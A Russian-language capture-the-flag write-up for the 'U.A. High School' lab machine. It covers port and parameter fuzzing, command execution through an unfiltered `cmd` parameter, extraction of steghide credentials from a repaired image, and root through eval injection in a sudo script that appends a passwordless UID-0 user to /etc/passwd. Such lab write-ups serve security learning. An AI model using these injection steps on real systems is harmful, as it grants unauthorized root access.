# U.A. High School

### Необходимые навыки

- Перебор скрытых параметров веб-приложения (parameter fuzzing)
- Базовое понимание PHP и работа с RCE через незащищённый параметр
- Основы стеганографии: steghide, работа с магическими байтами через hexeditor
- Базовое понимание bash и эксплуатация `eval` с недостаточной фильтрацией

---

### Получение шелла

Скан портов через rustscan ничего неожиданного не даёт:

```
rustscan --ulimit 5000 --range 0-65535 -a ip -- -sC -sV
----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
ustScan: Because guessing isn't hacking.
pen 10.49.177.110:22
pen 10.49.177.110:80
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|  ...
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: U.A. High School
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Перехожу на сайт и фаззю директории параллельно с осмотром. В коде страниц ничего полезного нет; единственная форма действительно отправляет запросы (проверила через Burp), но ничего не даёт.

<img width="1462" height="487" alt="image" src="https://github.com/user-attachments/assets/600b8ab4-3fe9-42d9-b7c2-a100122532a1" />

Из результатов ffuf сразу ничего интересного — но обращаю внимание на поддиректорию `/assets`:

```
ffuf -u http://ip/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt:FUZZ -e .php,.html -ic -c

about.html              [Status: 200, Size: 2542, ...]
admissions.html         [Status: 200, Size: 2573, ...]
assets                  [Status: 301, Size: 315,  ...]
contact.html            [Status: 200, Size: 2056, ...]
courses.html            [Status: 200, Size: 2580, ...]
index.html              [Status: 200, Size: 1988, ...]
```

Страница по адресу `/assets` пустая — скорее всего, там лежит заглушка. Пустой `index.html` нулевого размера — стандартная практика для предотвращения листинга директории: при его наличии сервер возвращает 200 OK вместо 403 или списка файлов. Многие CMS создают такие файлы во всех внутренних папках автоматически. Это значит, что в директории вполне могут лежать и другие файлы — фаззю:

```
images                  [Status: 301, Size: 322, ...]
index.php               [Status: 200, Size: 0,   ...]
```

Интересно: `index.php` существует и возвращает 200, но с нулевым содержимым. Это нетипично для обычной заглушки — есть вероятность, что скрипт что-то выполняет и принимает скрытые параметры. Фаззю их:

```
ffuf -u "http://ip/assets/index.php?FUZZ=id" -w /usr/share/wordlists/dirb/common.txt -fs 0
```

Скрипт действительно принимает параметр `cmd` и выдаёт ответ в base64:

<img width="872" height="124" alt="image" src="https://github.com/user-attachments/assets/d0322974-6824-4c8d-bf10-f99e32d168dc" />

Перед тем как опрокидывать reverse shell, читаю `index.php` через Burp, чтобы убедиться в логике фильтрации. Фильтрации нет — можно работать.

<img width="1920" height="527" alt="image" src="https://github.com/user-attachments/assets/31465981-b24d-43a5-8600-283849c0afa6" />

---

### Взятие юзера

Оказываемся внутри с правами `www-data`. Пока работает LinPEAS (загружаю через питоновский сервер + wget в `/tmp`), исследую систему вручную. Из `/etc/passwd` узнаю о пользователе `deku` — наверняка его и нужно взять перед root. Также нахожу загадочный файл с base64-строкой:

```
www-data@ip-10-49-177-110:/var/www/Hidden_Content$ cat passphrase.txt
QWxsb...
```

Пробую использовать её как пароль для `deku` — не подходит. Но слово «passphrase» наводит на мысль о стеганографии: именно его просят при извлечении данных через steghide. Скачиваю картинки из `/assets/images` к себе на машину и прогоняю через steghide:

- `yuei.jpg` — пусто
- `oneforall.jpg` — steghide выдаёт ошибку: файл повреждён

Открываю файл в `hexeditor` и сразу вижу проблему:

```
File: oneforall.jpg.1                                       ASCII Offset: 0x00000010 / 0x00017FD7 (%00)   
00000000  89 50 4E 47  0D 0A 1A 0A   00 00 00 01  01 00 00 01                             .PNG............
```

Магические байты соответствуют PNG, а не JPEG. Пробую два подхода:

1. Поменять расширение на `.png` и прогнать через zsteg (файл заканчивается на `FF D9` — это маркер конца JPEG, значит нужно ещё заменить окончание на стандартное для PNG: `00 00 00 00 49 45 4E 44 AE 42 60 82`). Вариант не сработал.

2. Починить магические байты, заменив их на корректные для JPEG. Основные варианты заголовков JPEG:

| Заголовок | Описание |
|---|---|
| `FF D8 FF DB` | JPEG без метаданных |
| `FF D8 FF EE` | Маркер APP14 (Adobe) |
| `FF D8 FF E1 ?? ?? 45 78 69 66 00 00` | EXIF (фото с камеры, `??` — длина сегмента) |
| `FF D8 FF E0 00 10 4A 46 49 46 00 01` | JFIF (стандартный JPEG из интернета) |

Наиболее вероятен JFIF. Заменяю первые байты через `hexeditor` на `FF D8 FF E0 00 10 4A 46 49 46 00 01` — файл починился:

```
sudo steghide extract -sf oneforall.jpg 
Enter passphrase: 
wrote extracted data to "creds.txt".
```

Получаем учётные данные, подключаемся под `deku`.

---

### Повышение привилегий до root

```
sudo -l

User deku may run the following commands on ip:
    (ALL) /opt/NewComponent/feedback.sh
```

Смотрю скрипт — редактировать его нельзя, хотя `deku` является владельцем:

```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback

if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```

Красный флаг — `eval "echo $feedback"`. Переменная подставляется в `eval` без кавычек, а фильтрация ввода неполная: блокирует обратные кавычки, `$()`, `|`, `&`, `;` — но не блокирует операторы перенаправления `>>`. Это означает, что мы можем дописать произвольный текст в любой файл с правами root, в том числе в `/etc/passwd`.

Запускаю скрипт с правами sudo и добавляю нового пользователя с UID/GID 0:

```
deku@ip:/opt/NewComponent$ sudo ./feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
"user::0:0:root:/root:/bin/bash" >> /etc/passwd
It is This:
Feedback successfully saved.
```

Проверяю `/etc/passwd` — пользователь `user` без пароля с правами root создан. Переключаюсь на него и забираю флаг.

<img width="413" height="84" alt="image" src="https://github.com/user-attachments/assets/0e5241d1-5a64-493a-afd7-92fc7ace4b9c" />
